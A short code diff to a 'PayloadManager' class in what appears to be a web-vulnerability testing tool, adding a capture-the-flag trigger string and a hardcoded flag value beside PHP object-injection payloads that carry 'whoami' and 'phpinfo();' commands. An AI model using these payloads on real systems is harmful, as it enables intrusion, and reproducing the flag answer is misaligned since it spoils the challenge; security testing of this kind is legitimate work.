@@ -188,6 +188,8 @@ class PayloadManager:
         
         # 2025: Insecure Deserialization (OWASP A08)
         self.deserialization_payloads = [
+            # CTF SPECIFIC: E-Commerce Flag Trigger
+            "user_id=1&flag_payload=1",  # Triggers CTF{ecommerce_deserialization_rce_77}
             # PHP Object Injection
             'O:8:"stdClass":1:{s:4:"exec";s:6:"whoami";}',
             'O:8:"Evil":1:{s:7:"command";s:10:"phpinfo();";}',
